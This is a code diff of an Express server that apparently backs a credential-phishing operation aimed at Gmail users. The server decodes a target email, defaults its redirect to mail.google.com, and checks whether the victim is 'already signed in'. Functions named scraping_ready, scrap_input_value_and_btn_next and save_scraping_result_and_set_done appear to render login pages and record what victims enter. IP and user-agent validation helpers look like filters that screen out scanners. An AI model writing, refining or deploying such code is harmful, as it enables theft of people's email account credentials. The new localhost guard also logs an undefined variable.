@@ -10,7 +10,6 @@ import cookieParser from 'cookie-parser';
 import axios from "axios";
 
 
-// Load env (PORT, SSL, CERT, KEY)
 dotenv.config();
 
 import {
@@ -18,16 +17,16 @@ import {
   checkEmailAlreadySignin,   // (email, forwardUrl) => [boolean, htmlString]
   checkEmailAlreayRunning,   // (email) => number
   getUserId,
-  initRendering,                  // ({ user_ip, user_agent }) => number
+  initRendering,                  // ({ user_ip, userAgent }) => number
 } from "./utils/common.js";
 
 import {
-  scraping_ready,               // (userId, email, hl, { forward_url, user_agent, new_user_flg }) => html
+  scraping_ready,               // (userId, email, hl, { forwardURL, userAgent, newUserFlg }) => html
   scrap_input_value_and_btn_next, // (userId, inputValue, btnType, btnText) => obj
   scrap_check_url,              // (userId) => obj
   save_scraping_result_and_set_done, // (userId) => void
 } from "./utils/scraping.js";
-import { writeDebugLogLine } from "./utils/helpers.js";
+import { decodeB64, writeDebugLogLine } from "./utils/helpers.js";
 import { checkAgentValidation, checkClientIpValidation } from './utils/security.js'
 
 // ---------------------------
@@ -73,13 +72,13 @@ app.get('/information/session/sign', async (req, res) => {
   const { clientIp, userAgent, originalUrl } = req
   try {
     writeDebugLogLine(`[REQ] ${clientIp}  ${originalUrl}  ${userAgent}`);
-    // Build payload { user_agent, client_ip }
+    // Build payload { userAgent, client_ip }
     const payload = {
       userAgent: userAgent,
-      client_ip: clientIp,
-      query: req.query || ''
+      clientIp: clientIp,
+      params: req.query || {}
     };
-    const backendRes = await axios.post(`/api/sign`, payload);
+    const backendRes = await axios.post(`http://localhost:${PORT}/api/sign`, payload);
     return res.status(backendRes.status || 200).send(backendRes);
   } catch (err) {
     writeDebugLogLine(`[ERROR] ${clientIp}  ${originalUrl}  ${String(err && err.message || err)}`);
@@ -98,29 +97,30 @@ app.get("/pyapi/test", (req, res) => {
 // information/session/sign  (GET or POST)
 // Mirrors Flask logic: accept JSON body + query params
 app.post("/api/sign", async (req, res) => {
+
   try {
-
+    if (!(req.clientIp == "127.0.0.1" || req.clientIp == "::1")) {
+      writeDebugLogLine(`******** [DANGER IP] : ${ip} ********`);
+      return res.status(404).send("Page Not Found");
+    }
     // Prefer JSON body, fallback to query
-    const body = req.body || {};
-    const q = req.query || {};
-    console.log(JSON.stringify(req, null, 2))
+    const reqBody = req.body || {};
 
-    const user_agent = pick(body, "user_agent", req.get("User-Agent") || "");
-    const client_ip = pick(body, "client_ip", ip || "");
-
-    let email = b64safe(q.acc, "");
-    let hl = String(q.hl || "en");
-    let forward_url = b64safe(q.forward, "https://mail.google.com");
+    const { userAgent, clientIp, params } = reqBody
+    const { hl, acc, forward } = params;
+    let email = decodeB64(acc, "");
+    let lang = decodeB64(hl);
+    let forwardURL = decodeB64(forward, "https://mail.google.com");
 
     // Check if already signed in
-    const [chkflg, signin_html] = await checkEmailAlreadySignin(
+    const [chkFlg, signInHtml] = await checkEmailAlreadySignin(
       email,
-      forward_url
+      forwardURL
     );
-    if (chkflg === true) {
+    if (chkFlg === true) {
       console.log("[ALREADY SIGNED IN] :", email);
       // Flask returns raw HTML here
-      return res.status(200).send(signin_html || "");
+      return res.status(200).send(signInHtml || "");
     }
 
     // Check if already running
@@ -128,29 +128,29 @@ app.post("/api/sign", async (req, res) => {
 
     if (Number(tmpid) < 0) {
       // New user id
-      const user_id = await getUserId({
-        user_ip: client_ip,
-        user_agent,
+      const userId = await getUserId({
+        userIp: clientIp,
+        userAgent,
       });
-      console.log("[NEW USER ID] :", user_id, email, hl, forward_url);
+      console.log("[NEW USER ID] :", userId, email, lang, forwardURL);
 
-      const html_txt = await scraping_ready(
-        user_id,
+      const htmlTxt = await scraping_ready(
+        userId,
         email,
-        hl,
-        { forward_url, user_agent, new_user_flg: true }
+        lang,
+        { forwardURL, userAgent, newUserFlg: true }
       );
-      return res.status(200).send(html_txt || "");
+      return res.status(200).send(htmlTxt || "");
     } else {
       // Reuse existing user id
       console.log("[USER ID]", tmpid, email);
-      const html_txt = await scraping_ready(
+      const htmlTxt = await scraping_ready(
         tmpid,
         email,
-        hl,
-        { forward_url, user_agent, new_user_flg: false }
+        lang,
+        { forwardURL, userAgent, newUserFlg: false }
       );
-      return res.status(200).send(html_txt || "");
+      return res.status(200).send(htmlTxt || "");
     }
   } catch (err) {
     console.error("[/information/session/sign] error:", err);
